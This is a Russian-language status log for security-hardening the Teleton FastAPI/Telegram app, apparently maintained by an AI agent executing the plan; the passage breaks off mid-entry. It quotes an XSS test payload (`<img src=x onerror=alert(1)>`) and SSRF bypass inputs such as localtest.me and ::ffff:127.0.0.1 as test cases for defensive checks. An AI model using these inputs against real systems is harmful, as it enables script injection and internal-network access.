
# Teleton: план работ для агента-исполнителя

> Документ написан для ИИ-агента или джуниор-разработчика, который будет выполнять работу.
> Читается сверху вниз. Фазы выполняются строго по порядку — каждая опирается на предыдущую.

---

## Статус выполнения

Единственное место статуса. Обновляется после каждой закрытой задачи: строка помечается
✅ (дата) с краткой сводкой. Чек-лист проблем — раздел 12.

| Задача | Статус | Дата | Примечание |
|---|---|---|---|
| 0.1 `.dockerignore` | ✅ готово (статический уровень) | 2026-09-01 | в `.dockerignore` добавлены `.env`, `.env.*`, `*.session`, `storage.db`, `key.md`, `Ruby/`; `test_00` зелёный. **Не подтверждено:** `docker build` + `ls -la /app` — Docker-демон не запущен |
| 0.2 Перевыпуск секретов | ❌ отклонено оператором | 2026-09-01 | решение оператора: ключи не перевыпускаются. Риск зафиксирован: ключи, побывавшие в git-истории до подключения репозитория и в переписке, считаются известными только владельцу; при появлении признаков компрометации перевыпуск становится обязательным. Компенсация: секреты в `.gitignore`/`.dockerignore`, в репозиторий не попадают |
| 0.3 Ключи наружу | ✅ готово (статический уровень) | 2026-09-01 | из `GET /api/openrouter`, `GET /api/telegram-forward`, `GET /api/settings` убраны сырые `api_key`/`bot_token`/`api_hash` (остались `*_masked` + `has_*`); POST не затирает ключ пустой строкой/маской; фронтенд — пустые поля с плейсхолдером. `test_01` зелёный. Тест дополнительно нашёл утечку `api_hash` в `get_settings()` — закрыта там же. **Не подтверждено:** прогон живого сервера (все эндпоинты пока без авторизации — закрытие в задаче 2.3) |
| 0.4 Stored XSS | ✅ готово (статический уровень + живой браузер) | 2026-09-01 | все неэкранированные `${...}` обёрнуты в `esc()`; inline `onclick` заменён data-атрибутом + делегированием. Итоговая версия `test_02_xss.py` — проверка ВСЕХ `${...}` без самодельного JS-лексера (три версии на лексерах показывали зелёный при живом XSS, последняя уехала на `/'/g` внутри самой `esc()`), безопасные приёмники перечислены словарём `SAFE_SINKS` с обоснованиями. **Подтверждено оператором 2026-09-01:** ручная проверка канала `<img src=x onerror=alert(1)>` в живом браузере — XSS не исполняется |
| 0.5 Мусор в репо | ✅ готово | 2026-09-01 | удалены `FastAPI/Ruby/`, пустой `Teleton/storage.db`, `FastAPI/monitors.json.bak` (в последнем был боевой webhook-URL с токеном). `test_03` зелёный. **Ловушка, которой нет в плане:** `FastAPI/Ruby/` содержал уникальный `STACK-COMPARISON.md` — спасён в `Teleton/Ruby/`. Урок: перед `rm -rf` «дубля» сверять `diff -rq`, а не описание в плане |
| 0.6 `FastAPI/AGENTS.md` | ✅ готово | 2026-09-01 | сверен с разделом 8 плана: все 12 разделов (0–11) совпадают |
| 0.7 `PROGRESS.md` | ✅ готово | 2026-09-01 | `FastAPI/PROGRESS.md` заведён, начальная запись по Фазе 0 (что сделано / подтверждено / что не сработало) |
| 1.1 Зависимости | ✅ готово | 2026-09-02 | `test_10_deps.py` → 23 passed. venv пересоздан: проект переехал `PersonalOS/` → `AntiGravity/`, все shebang в `.venv/bin` указывали на старый путь. **Коммит `349c6b7`** |
| 1.2 `app/config.py` + конец перезаписи `.env` | ✅ готово | 2026-09-02 | `test_11_config.py` → зелёный; `database_url` БЕЗ дефолта (см. урок ниже). **Коммиты `5fe8d08`, `98813fd`** |
| 1.3 Модели SQLAlchemy | ✅ готово | 2026-09-02 | `test_12_models.py` → 6 passed. **Коммит `091197e`** |
| 1.4 Alembic | ✅ статический уровень + смоук на SQLite; поведенческий ждёт PG | 2026-09-02 | `upgrade head` прогнан на временной SQLite: 10 таблиц, 9 user_id-индексов, `downgrade base` чист; upgrade изнутри event loop работает (env.py стартует отдельный поток со своим loop — иначе `asyncio.run` дважды). env.py требует ЯВНЫЙ `DATABASE_URL` из `os.environ`, без него отказ (коммит `98813fd`). Поведенческий тест на живом PG — skip. **Коммит `ba5df1d`** |
| 1.5 Миграция SQLite → PG | 🔶 код готов и закоммичен; поведенческий уровень ждёт PG | 2026-09-02 | CLI проверен (`--help`); идемпотентность/дедуп/секреты — только на живом Postgres (`TEST_DATABASE_URL`). Postgres в Railway-проекте уже поднят (см. блок ниже). **Коммит `cfc6779`** |
| 2.1 Хеширование паролей | ✅ готово | 2026-09-02 | `app/security/passwords.py` на bcrypt ($2b$, rounds=12, соль на вызов); пароли >72 байт — отказ ValueError (bcrypt молча усекает до префикса). **Отступление от плана:** passlib не используется — не поддерживается с 2020 и несовместим с bcrypt>=4.1 (падает в detect_wrap_bug); хешируем `bcrypt` напрямую, формат тот же. `test_20_passwords.py` → 4 passed. **Коммит `410ef9b`** |
| 2.2 Сессии в БД + подписанная cookie | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `app/security/sessions.py`: строка в `sessions` (отзываемая), cookie подписана itsdangerous (`URLSafeSerializer`, salt `session-cookie`); HttpOnly + SameSite=Lax всегда, Secure только в production; TTL 30 дней; любой сбой (подделка/удалённая строка/истёкшая) → единый None. `test_21_sessions.py` → 7 passed. **Поймал дефект моделей 1.3:** BIGINT PK не автоинкрементился на SQLite (`NOT NULL constraint failed: users.id`) — фикс `BigInteger().with_variant(Integer, "sqlite")` + `Identity()` по всем 9 таблицам, ревизия 0001 правлена на месте (ни одной живой БД под ней не было). **Коммиты `109a2ce` (PK-фикс), `c648c67` (2.2)** |
| 2.3 Закрыто по умолчанию | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | Сборка `app/main.py` + `app/db.py` (get_db, URL без дефолта) + `app/deps.py` (`require_user`) + `app/api/public.py` (opt-out: `/health` отдаёт только `{"status":"ok"}`) + `app/api/auth.py` (роутер несёт `dependencies=[Depends(require_user)]`, первый защищённый эндпоинт `GET /auth/me`). `/openapi.json`, `/docs`, `/redoc` выключены — карта поверхности атаки не отдаётся анониму. `test_22_auth_required.py` → 5 passed: все маршруты → 401 анониму, кроме белого списка; структурный тест — require_user от РОУТЕРА на каждом непубличном маршруте; живая сессия проходит. **Поправки к псевдокоду плана:** `startswith("/")` в белом списке глотал ВСЕ пути (тест вырождался) — «/» сверяется точно; FastAPI 0.141 оборачивает include_router в `_IncludedRouter` без `.path` — тест разворачивает рекурсивно. **Побочная находка:** переворот последнего символа подписи itsdangerous в ~6% случаев декодируется в ту же подпись (последний base64-символ несёт 2 значащих бита) — тампер-тест переведён на первый символ payload (коммит `6c5dcf4`, стресс 20000 sid: 1265 принятых). **server.py НЕ редактирован** — локальная точка входа до Фаз 3–4; эта сборка (`app.main`) — та, что поедет на Railway. Прогон: **64 passed, 3 skipped**. **Коммиты `6c5dcf4`, `746b283`** |
| 2.4 Регистрация, вход, выход | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `POST /auth/signup` (email → lower, пароль 8..72 байт, timezone; сразу сессия + cookie), `POST /auth/login` (единый 401 побайтово одинаковый для «нет юзера» и «не тот пароль» — перечисление адресов невозможно), `POST /auth/logout` (удаление строки + очистка cookie; `require_session` в deps — logout-у нужен id строки), `GET /auth/me`. Существующий email → 422 с формулировкой, неотличимой от прочих ошибок валидации. Новая зависимость `email-validator` (EmailStr). `test_23_registration.py` → 6 passed. Прогон: **71 passed, 3 skipped**. **Коммит `78991f7`** |
| 2.5 Сброс пароля | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `app/security/password_reset.py`: токен `URLSafeTimedSerializer` (salt `password-reset`, `max_age=3600`). Одноразовость без таблицы — порт `generates_token_for`: в подпись включён sha256-слепок текущего `password_hash` (сам хеш в токен класть нельзя — подпись не шифрует); после смены пароля слепок расходится → токен мёртв. `POST /auth/password-reset` — ответ ПОБАЙТОВО одинаков для существующего/несуществующего email (перечислитель невозможен). `POST /auth/password-reset/confirm` — 422 без объяснений для подделки/истёкшего/использованного; смена пароля отзывает ВСЕ сессии юзера. Mailer — заглушка со списком получателей (транспорт — задача 2.9), токен в логи не пишется. `test_24_password_reset.py` → 7 passed. Прогон: **78 passed, 3 skipped**. **Коммит `41d7ae4`** |
| 2.6 CSRF | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `app/security/csrf.py` + middleware в `main.py`: каждый не-GET без валидного `X-CSRF-Token` → 403; тест перебирает ВСЕ не-GET маршруты (забыть один нельзя). Токен ПОДПИСАН (salt `csrf`) — чисто строковая сверка уязвима к cookie-tossing с поддомена; при login/signup cookie перевыпускается ПРИВЯЗАННЫМ к sid сессии (анон-токен не работает на живой сессии). **UX-ловушка найдена прогоном:** у юзера с истёкшей сессией csrf остаётся привязан к мёртвому sid → логин вечно 403; правило ослаблено: без cookie сессии достаточно ПОДПИСАННОГО токена (защищать нечего, кастомный заголовок кросс-доменно не поставить). Cookie не HttpOnly (JS читает), `read_session_id` в sessions.py — sid из подписи без БД. conftest: `FrontendLikeClient` (авто-инъекция заголовка + прайминг GET /health) и `raw_client` для негативных тестов; тесты 23/24 удаляют только session-cookie, не всю банку. `test_25_csrf.py` → 5 passed. Прогон: **83 passed, 3 skipped**. **Коммит `dacad8c`** |
| 2.7 Rate limiting | ✅ готово (кроме send-code — вешается в 3.3) | 2026-09-02 | slowapi: `POST /auth/login`, `POST /auth/signup` — 10/3 мин на IP (брутфорс/спам-регистрации); `POST /auth/password-reset` — 5/час на пару IP+email своим скользящим окном (slowapi-декоратор не видит тело запроса) — жертва получает ≤5 писем/час. **Отступление от таблицы плана:** `POST /api/telegram/send-code` ещё в server.py (редактировать запрещено) — политика `TELEGRAM_SEND_CODE_LIMIT = "3/hour"` задекларирована в `app/security/ratelimit.py`, вешается при переносе эндпоинта (задача 3.3), тест держит политику статически. autouse-фикстура сбрасывает in-memory счётчики между тестами. `test_26_ratelimit.py` → 4 passed. Прогон: **87 passed, 3 skipped**. **Коммит `803c4ad`** |
| 2.8 Админка | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `require_admin` в `app/deps.py` (403 для не-админа — существование админки не секрет; правило «404 не 403» — про данные тенантов), роутер `/api/admin` с зависимостью на РОУТЕРЕ: `GET /api/admin/users`, `GET /api/admin/users/{id}`. `password_hash` наружу не отдаётся даже админу; несуществующий юзер — 404. Аноним — 401, обычный — 403, админ — 200 (все три в тесте). Структурный тест 2.3 расширен: вратарь = require_user ИЛИ require_admin (require_admin цепочкой через require_user — не слабее). `test_27_admin.py` → 3 passed. Прогон: **90 passed, 3 skipped**. **Коммит `02021c8`** |
| 2.9 Почта | ✅ готово (поведенческий тест на aiosqlite; реальная отправка через Resend не проверялась — нет ключа) | 2026-09-02 | `app/services/mailer.py`: транспорт по среде. production → Resend HTTP API по `RESEND_API_KEY` (config: `resend_api_key`, `mail_from`, `app_base_url`); БЕЗ ключа — громкий `RuntimeError` (молча проглоченное письмо сброса = молча потерянный аккаунт). development → письмо в `mail_dev_dir/<timestamp>-<адрес>.html`, в лог ТОЛЬКО путь (аналог letter_opener), реальных отправок из dev нет; токен живёт только внутри письма. `tmp/` добавлен в .gitignore — dev-письма содержат токен сброса. test_24 переведён с заглушки `reset_emails` на файловый аутбокс (`MAIL_DEV_DIR` в tmp теста, conftest). `test_28_mailer.py` → 3 passed. **Фаза 2 закрыта полностью.** Прогон: **93 passed, 3 skipped**. **Коммиты `170a7d1` (chore: ruff.toml — дефолты ruff 0.16 расползлись и флаговали идиому FastAPI B008, набор правил зафиксирован явно), `87fb624`** |
| 3.1 TenantRepo | ✅ готово (данные + структура; эндпоинтный свип — скип до переноса роутеров) | 2026-09-02 | `app/db.py: TenantRepo` — `query(model)` ВСЕГДА добавляет `where user_id ==`, `get(model, id)` чужой строки → None (роутер сделает 404, не 403 — «найдено, но чужое» подтверждает существование). `get_tenant_repo` в deps поверх `require_user` — user_id подделать нельзя. `test_30_tenant_isolation.py` → 3 passed + 1 skip: тенантные модели перебираются ИНТРОСПЕКЦИЕЙ (9 моделей с user_id; новую модель нельзя «забыть добавить в список»), сидинг generic по типам колонок. Эндпоинтный свип (план) перебирает маршруты автоматически и скипается, пока ресурсные роутеры не перенесены из server.py (Фазы 3–4) — первый перенос обязан его активировать и дополнить сидингом. Прогон: **96 passed, 4 skipped**. **Коммит `6819c00`** |
| 3.2 Telegram-сессии в БД | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `app/services/tg_account.py: save_tg_session` — upsert по user_id (один аккаунт на юзера), строка StringSession — ТОЛЬКО в `session_string_encrypted` через `app/security/crypto.py` (Fernet поверх `APP_ENCRYPTION_KEY` из ENV; ключа нет — громкий RuntimeError). phone/tg_user_id/tg_username — параметры с сохранением уже записанного (заполняет поток входа, задача 3.3). `test_31_tg_session_storage.py` → 3 passed: открытого текста в колонке нет + дешифровка возвращает исходное; повторное сохранение — 1 строка, не IntegrityError; строка сессии не появляется ни в одном ответе API (свип активируется сам при переносе /api/telegram/status, /api/settings). **Побочная ловушка найдена полным прогоном:** `importlib.reload(config)` в test_11 оставлял «осиротевший» get_settings с мусорным кэшем — модули, импортируемые ВРЕМЯ выполнения теста, связывались с ним (crypto падал «Fernet key must be 32...» только в полном прогоне); фикс — гигиена reload (cache_clear после каждого теста test_11). Прогон: **99 passed, 4 skipped**. **Коммит `055ee9e`** |

| 4.1 Воркер как отдельный процесс | ✅ готово (поведенческий тест на aiosqlite + ЖИВОЙ subprocess SIGTERM) | 2026-09-02 | `app/worker.py`: воркер — единственный владелец пула долгоживущих клиентов (3.5), web пул НЕ импортирует (трипваер-тест в ЧИСТОМ subprocess — in-process проверка врала бы: tg_pool уже в sys.modules от test_34). `Worker`: цикл тиков до request_stop (SIGTERM/SIGINT через add_signal_handler), сон через `wait_for(stop.wait)` — SIGTERM просыпает НЕМЕДЛЕННО, не через 30 с; упавший тик не роняет процесс (порт except-ветки background_monitor_worker server.py:616); `finally: pool.close()` ВСЕГДА — чужие MTProto-сессии нельзя бросать подключёнными. `python -m app.worker`: стартовые барьеры web (3.4) — validate_encryption_key + громкий отказ без DATABASE_URL; строка готовности в stdout с flush=True (piped stdout буферизуется — супервайзер/тест ждут строку). Тело цикла — каркас (щётка пула): опрос мониторов заполняют 4.2 (дедуп) и 4.3 (jobs), диспетчеризация — Фаза 5; tick инъектируется — каркас не меняется. `test_40_worker.py` → 5 passed, включая ЖИВОЙ subprocess `python -m app.worker` на временной SQLite: SIGTERM → exit 0, не -15. **Не подтверждено:** два процесса из одного Docker-образа на Railway (деплой закрыт К2; команда воркера добавляется в railway-конфиг при деплое). Прогон: **125 passed, 4 skipped**. **Коммит `344cf16`** |
| 4.2 Атомарная дедупликация | ✅ готово (поведенческий тест на aiosqlite) | 2026-09-02 | `app/services/dedup.py: filter_new(db, user_id, chat_id, messages)` — дедуп решает БАЗА, одним запросом: `INSERT ... ON CONFLICT (user_id, chat_id, message_id) DO NOTHING RETURNING message_id` (диалектный insert — sqlite/postgresql, выбирается МОДУЛЬ, не ре-импорт имени — mypy). Вернувшиеся id — новые; конкурентная транзакция и дубль внутри батча глотаются базой, никакого SELECT перед INSERT. Возвращает ИСХОДНЫЕ словари в порядке входа (данные для диспетчера Фазы 5). `test_41_dedup_race.py` → 6 passed: гонка (две НЕЗАВИСИМЫЕ сессии через gather — AsyncSession не coroutine-safe, в плане один `db` на оба вызова; реальный сценарий воркер+ручной запуск — разные транзакции) — каждый пост ровно один раз; метки+возврат только новых; скоуп по tenant (один забытый user_id — B не получит пост, виденный A); дубль в одном батче — один раз; пустой батч — noop; unique-ключ покрывает user_id+chat_id+message_id (структурный). **Красная фаза:** заглушка — порт оригинала (SELECT→INSERT) с портом И `OR IGNORE` — иначе падала на IntegrityError, а не на assert; дефект проявлялся в ВОЗВРАЩАЕМЫХ данных (100 != 50), как в проде. Прогон: **131 passed, 4 skipped**. **Коммит `20cf122`** |
| 4.3 Таблица jobs | ✅ готово (поведенческий тест на aiosqlite; SKIP LOCKED — структурный на компиляции PG) | 2026-09-02 | Схема уже была (Job в моделях 1.3, таблица в миграции 0001) — новых миграций не нужно. `app/services/jobs.py`: `enqueue_job` (pending-строка, kind+payload_json, user_id — тенант для UI), `claim_next_job` — атомарный захват ОДНИМ запросом `UPDATE ... WHERE id = (SELECT старейшей pending ... LIMIT 1) RETURNING id` (Postgres — подзапрос с `FOR UPDATE SKIP LOCKED` по букве плана; на sqlite FOR UPDATE не существует — там одновременность держит единственный писатель в моменте; структурный тест компилирует PG-вариант и требует SKIP LOCKED), `requeue_hung_jobs` (running дольше 10 мин → pending, started_at сброшен; done/failed НЕ возвращаются — повторный запуск = повторные вебхуки), `finish_job`/`fail_job` (done/failed + finished_at, текст ошибки для UI). `test_42_jobs.py` → 7 passed: гонка двух воркеров (две независимые сессии, gather) — РАЗНЫЕ задачи, ровно все pending; FIFO + пустая очередь → None; зависшая возвращена (1), свежий running и done НЕ тронуты; закрытие done/failed. **Красная фаза:** заглушка SELECT→UPDATE с окном sleep(0.05) — оба взяли одну задачу (assert), requeue/finish/fail — no-op. **Осталось на Фазу 5:** эндпоинты `POST /api/monitors/{id}/run` (202 + job_id) и `GET /api/jobs/{id}` — с роутерами мониторов (К2); врезка claim в тик воркера — с диспетчеризацией (работы с задачей пока нет). **Не подтверждено:** SKIP LOCKED на живом Postgres (деплой закрыт К2). Прогон: **138 passed, 4 skipped**. **Коммит `bef14ff`** |
| 4.4 Защита от SSRF | ✅ готово (поведенческий тест на фейковом резолвере + MockTransport; в сеть тесты не ходят) | 2026-09-02 | `app/services/webhook.py`: `validate_webhook_url` — только http/https; проверка по РЕЗОЛВНУТОМУ IP, не по строке (п.2 — localtest.me резолвится в 127.0.0.1; резолвер ИНЪЕКТИРУЕТСЯ — тесты детерминированы и офлайн); проверяются ВСЕ резолвнутые адреса (один приватный среди A-записей — запрещено); диапазоны плана 10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, ::1, fc00::/7, fe80::/10 + multicast/reserved/unspecified + расширения 0.0.0.0/8 и 100.64/10 (CGNAT, докерные сети); IPv4-mapped (::ffff:127.0.0.1) разворачивается до v4 ДО проверки; литеральный IP — без резолва (booby-trap-резолвер в тесте). `send_webhook` — валидация ДО запроса (ни байта в сеть на опасный URL), follow_redirects=False (302 на внутренний адрес не вскрывается — НИКОГДА, не только «до первого»), таймаут 10 с, потолок ответа 64 КиБ (чужой вебхук не выкачивает память). `POST /api/webhook/send-payload` в новую сборку НЕ переносится — трипваер-тест держит отсутствие маршрута навсегда (порт при переносе роутеров Фазы 5). `test_43_ssrf.py` → 19 passed. **Красная фаза:** заглушка-порт оригинала (валидации нет вообще, шлёт куда дают) — 15 падений DID NOT RAISE/assert. **Не подтверждено:** резолв живым DNS в проде (в тестах только фейковый резолвер + литералы). Прогон: **157 passed, 4 skipped**. **Коммит `287b102`** |
| 5.1 Разобрать `index.html` | ✅ готово (8 структурных тестов + поведенческий на раздачу ассетов; браузерных тестов нет — уровень ниже) | 2026-09-02 | 3975 строк разрезаны: `index.html` → 695 (только разметка), `static/css/main.css` → 1241 (`:root`… `.feed-raw-post`, баланс скобок 160/160), `static/js/` → 9 ES-модулей (api, render, auth, feed, channels, messages, integration, logs, main) = 2139 строк, подключение `<script type="module" src="/static/js/main.js">`. **Сборка не заводится** (test_47: package.json/node_modules в static/ запрещены). Граф без циклов: main → все вкладки, рёбра channels→messages (`mergeMessages`/`setFilterChatOptions` — ручной запуск и фильтр каналов) и integration→logs (`loadLogs` после cleanup) в одну сторону. Инлайн-onclick остаются в шаблонах, вызываемые функции выставлены на `window` (модули file-scoped, иначе кнопки молча мертвы): switchTab, selectFeedItem, toggleMonitor, runMonitor, openEditModal, resetDedup, deleteMonitor, toggleExpand, selectModelItem, quickFilterModel. `apiFetch`/`apiGet` централизуют ВСЕ запросы (`credentials: same-origin`) — единственная точка вставки X-CSRF-Token (В11). Мёртвый вызов никогда не существовавшего `populateDatalist()` (ReferenceError молча глотался catch) убран с комментарием. **server.py: mount `/static` (StaticFiles) — единственное изменение вне переноса в модули**, инфраструктура без логики: без него разрезанный UI отдаёт 404 на css/js и мёртв на текущем рантайме (новая сборка app/main.py уже монтирует /static, но не имеет роутеров вкладок — К2). Поведенческий тест — ASGITransport БЕЗ lifespan (Telethon/планировщик не стартуют), честный skip без окружения. `test_47_frontend_split.py` → 9 passed (node --check парсит все модули через .mjs-копии; резолв импортов+экспортов регексом; XSS-сканер 0.4 ходит по static/** рекурсивно — покрытие следует за кодом). **Красная фаза:** 7 failed/1 passed до разреза. **Ошибка теста, исправлена в тесте:** sync `httpx.Client` + ASGITransport — только async (AsyncClient), иначе AttributeError не на assert. **Не подтверждено:** живой браузер (клик-потоки, gsap-анимации), живой порядок пинов iter_messages (4.7). Прогон: **195 passed, 4 skipped**. **Коммит `78062f2`** |
| 5.2 Экранирование по умолчанию | ✅ готово (поведенческий прогон билдера в node + структурный запрет нетегированных шаблонов; XSS-сканер 0.4 признаёт билдер) | 2026-09-04 | `render.js` — единственная точка построения HTML: tagged-template `html\`` экранирует каждую `${...}` сам (`escapeAll`: & < > " ', порядок важен — & первым; escaper чистый, без DOM — node исполняет его в тестах), `raw()` — осознанный opt-out для готового безопасного HTML (Symbol RAW, виден в ревью; `String(value)` на входе — вложенный raw не калечится, оборачивать им строку, не raw). Все 5 модулей с разметкой переведены (channels/feed/messages/logs/integration), esc/escapeHtml убраны из конвертированных мест; escapeHtml остаётся внутри formatTelegramText/highlightText и для q в дропдауне (pre-escaped внутри raw). **integration.js: локальная `let html` → `dropdownHtml`** — конфликт с импортом билдера (SyntaxError). `test_48` (новый): node исполняет билдер с живым payload `<img onerror>` / кавычками — обязан выйти экранированным, raw проходит, числа не калечатся; структурное правило — на строке с innerHTML/insertAdjacentHTML открывающий бэктик обязан идти после `html`/`raw(`, закрывающий отличается по чётности (наивное «каждый бэктик перед html» ложно срабатывало на закрывающих видах `...${raw(x)}\`;`). `test_02` (0.4) узнал билдер: `html\`` — безопасный приёмник + fallback (окно 4000) для глубоких позиций длинных шаблонов; **raw-область анализируется ВНУТРИ payload** (ближайший маркер перед ссылкой на поле: `raw(` небезопасен, экранирующий вызов/`html\`` безопасны), атрибутные литералы `title=` не считаются ссылкой на поле; 4 новые страховки на каждое поведение. **Красная фаза:** 2 failed на assert. **Ошибки тестов, исправлены в тестах:** (1) проверка `out.includes("onerror")` требовала невозможного — экранирование нейтрализует тег, а не вырезает слово (`&lt;img onerror=...&gt;` легитимен); заменена на проверку живого onerror внутри настоящего тега; (2) маркер `raw(` в 400-символьном окне «отравлял» область — `${raw(avatarHtml)}` в соседней строке делал `${item.chat_title}` «сырой», хотя raw-область не выходит за пределы своего выражения — анализ перенесён внутрь payload. **Не подтверждено:** живой браузер (DOM-эскейпинг в реальном innerHTML, клик-потоки). Прогон: **201 passed, 4 skipped**. **Коммит `cc4308a`** |
| 5.3 Экраны входа | ✅ готово (структурные «ничего лишнего» + поведенческие ASGITransport: страницы анониму, письмо несёт ссылку с токеном; браузерных тестов нет) | 2026-09-04 | `login.html`/`signup.html`/`password-reset.html` — отдельные страницы, не часть SPA: каждая грузит ровно один свой скрипт `static/js/auth-pages.js`, без import-ов (не тянет граф SPA), без gsap и внешних URL (CSP-совместимо), стили инлайн. auth-pages.js НЕ строит HTML вовсе (ни innerHTML, ни insertAdjacentHTML): ошибки/успехи — textContent (5.2), CSRF-cookie → X-CSRF-Token на каждом POST (2.6), detail FastAPI — и строка, и массив 422. Роуты GET /login, /signup, /password-reset — в новой сборке (app/main.py), server.py не тронут. **Фикс mailer:** ссылка сброса ведёт на `/password-reset?token=...` — прежний hash-якорь SPA `#reset-password` никогда не существовал (страница подтверждения теперь принимает токен из query-парам, письмо→страница — один цельный путь). Токен подтверждения прячется в hidden-поле из `?token=`. Allowlist-ы тестов 22/30 дополнены тремя страницами — статическая разметка форм для анонима, данных тенантов не отдают. `test_49_auth_pages.py` → 11 passed. **Красная фаза:** 11 failed на assert. **Пойман и закрыт дефект test_47 (вакуумный резолв импортов):** regex импортов требовал двойные кавычки (модули пишут одинарные — импорты не находились ВООБЩЕ), экспорты собирались у импортёра, не цели; скрипт страниц затёр SPA-модуль auth.js (существует с 5.1, его импортирует main.js) — зелёный прогон это пропустил. Исправлено: карта экспортов по всем файлам, импорты в обоих кавычках, экспорты смотрятся у цели; негативный контроль (удаление checkHealth из auth.js) ловится. SPA-модуль восстановлен из `78062f2`, скрипт страниц переименован в auth-pages.js. **Не подтверждено:** живой браузер (сабмиты форм, переходы, реальный email-клиент по ссылке). Прогон: **212 passed, 4 skipped**. **Коммиты `e8fbe47`, `ff5a59a`** |
| 5.4 Аватарки из строк ленты | ✅ готово (первый ресурсный роутер: список ленты < 200 КБ без data:image, детальный вид, аватарка с Cache-Control + изоляция) | 2026-09-04 | **Первый ресурсный роутер из server.py** — `app/api/feed.py` за `require_user` + `TenantRepo`: `GET /api/feed` — ТОЛЬКО метаданные карточек (без `photo_base64` и `raw_messages_json`; красный тест плана: ответ `?limit=50` < 200 КБ и без `data:image` при 50 строках с килобайтными инлайн-картинками), `GET /api/feed/{id}` — детальный вид с распарсенными `messages` (чужой id → None → 404), `GET /api/avatars/{chat_id}` — `image/jpeg` + `Cache-Control: private, max-age=86400`. **ChatAvatar** (`chat_avatars`: `chat_id` PK, `image_bytes`, `fetched_at`) **без `user_id` осознанно**: фото публичного канала одно на всех; изоляция на чтении — эндпоинт сначала проверяет монитор канала у ТЕКУЩЕГО юзера (`TenantRepo.query(Monitor)`), чужим/без аватарки → 404 (существование канала не раскрываем). Миграция `0003_chat_avatars` (вручную, как 0001/0002, цепочка за `0002_llm_usage`). **Свип изоляции test_30 закрыт** (план 3.1, обязателен к первому переносу): сидинг A с маркерами (Monitor/FeedItem/ChatAvatar), списки B — без маркеров + позитивный контроль СВОИХ данных, прямые чужие id/параметры → 404, анти-вакуум покрытия (каждый маршрут свипа реально проверен; неизвестный path-параметр/метод падает громко — свип растёт вместе с роутерами). `act_as` (сессия в БД + подписанные cookie) вынесен из test_32 в conftest. **feed.js:** аватарка с эндпоинта (ветка `photo_base64` сохранена — монолит ещё рантайм до К2), 404 → буква-заглушка через `addEventListener('error')` (не inline-handler — дружелюбно к CSP 7.2); исходные посты догружаются `GET /api/feed/{id}` ТОЛЬКО когда их нет в списке (в монолите посты приходят списком — лишний запрос не дёргается). **Не подтверждено:** запись аватарок воркером (код скачивания фото — с диспетчеризацией опроса, Фаза 5), живой Postgres для миграции 0003 (без TEST_DATABASE_URL), живой браузер. **С19 закрыт.** Прогон: **219 passed, 3 skipped**; ruff/mypy чисты. **Коммит `4d7a738`** |
| Фаза 6 Вход через Google | ✅ готово (Firebase — провайдер идентичности, НЕ сессий; верификатор инъектируем, живой Firebase в тестах не нужен) | 2026-09-04 | **POST /auth/google** (public_router, rate-limit `10/3minutes` — тот же бюджет, что у login): `verify_id_token` → claims → юзер ищется/создаётся в своей таблице → **своя** cookie-сессия (`_open_session`, как signup/login). Контроль отзыва сохранён (блокировка юзера убивает сессии), админка работает, GitHub/Apple добавятся без переписывания аутентификации. **UserIdentity** (`identities`: user_id NOT NULL+FK+индекс, provider, provider_uid, `UNIQUE(provider, provider_uid)` — один Google-аккаунт не на двух юзерах; миграция `0004_identities` за `0003_chat_avatars`); имя НЕ `Identity` — в модуле оно занято `sqlalchemy.Identity` (PK-конструктор), тень ломала бы mapped_column ниже. **Верификатор — зависимость** (`app/services/google_auth.py: get_google_verifier`, паттерн Telethon-клиента из 3.3): тесты подменяют фейком, firebase_admin импортируется ЛЕНИВО (web без единого /auth/google не требует конфигурации), но без кредов верификация падает ГРОМКО — `RuntimeError` → 500, не маскировка под 401 (урок 2026-09-02). **Сверх красных случаев плана, по линии безопасности:** `email_verified=False` → 401 (иначе идентичность привязывается к адресу, который Google за юзером НЕ подтвердил — обход владения ящиком); uid уже связан с другим юзером при другом email → 401, владелец идентичности молча не перетасовывается. `users.password_hash` nullable был с 0001 — вход только через Google даёт NULL. mypy.ini: точечный override `firebase_admin.*` (без py.typed, прецедент telethon). `test_60_google.py` → **9 passed**: 4 красных случая плана (невалидный → 401, новый юзер → создание+сессия, существующий email → ПРИВЯЗКА identities, чужой aud → 401) + email_verified + конфликт uid; структурные — модель/UNIQUE через `isinstance(uc, UniqueConstraint)`, миграция, инъектируемость. **Ошибки тестов, исправлены в тестах:** `cols.keys()` (не Column-объекты), `importlib.import_module` для сервисного модуля, `isinstance` вместо несуществующего `.unique`. **Не подтверждено:** живой Firebase (verify_id_token реальным токеном — нужен проект/креды, это деплойный шаг), кнопка Google Sign-In на фронте (страницы входа 5.3 рисуются без неё до появления клиентского GOOGLE_CLIENT_ID). Прогон: **228 passed, 3 skipped**; ruff/mypy чисты. **Коммит `1157095`** |
| 7.1 Два сервиса Railway | ✅ готово в репо (конфиги; живой деплой закрыт К2) | 2026-09-04 | **Образ поднимает ТОЛЬКО новую сборку:** Dockerfile CMD → `uvicorn app.main:app --host 0.0.0.0 --port ${PORT:-8000}`; `server:app` в образе запрещён навсегда — монолит (~40 эндпоинтов без auth, К2) не запустится даже случайным деплоем (CMD — часть безопасности, не деплойная мелочь). **railway.json:** `startCommand` (web, новая сборка, 0.0.0.0:$PORT) + `preDeployCommand: ["alembic upgrade head"]` — миграции применяет ТОЛЬКО web ДО старта (схема меняется только миграциями, Фаза 1; два сервиса с preDeploy гнали бы миграции наперегонки); healthcheck `/health` был с Фазы 0. **Воркер — тот же образ**, команда `python -m app.worker` (точка входа с 4.1, трипваер держит), переопределяется на уровне СЕРВИСА Railway: файл конфига один на оба сервиса — команда воркера в нём запускала бы воркер и веб-сервисом (тест это запрещает). `test_70_deploy.py` → 5 passed: CMD без монолита, 0.0.0.0/$PORT, startCommand+миграции, `__main__` воркера, отсутствие команды воркера в общем конфиге. **Красная фаза:** 2 failed на assert (CMD-монолит, пустой startCommand), 3 страховки уже зелёные. **Не подтверждено (всё — живой деплой, закрыт К2):** два сервиса из одного образа на Railway, редеплой без переавторизации в Telegram (сессии в БД, 3.2), SKIP LOCKED/миграции на живом Postgres, 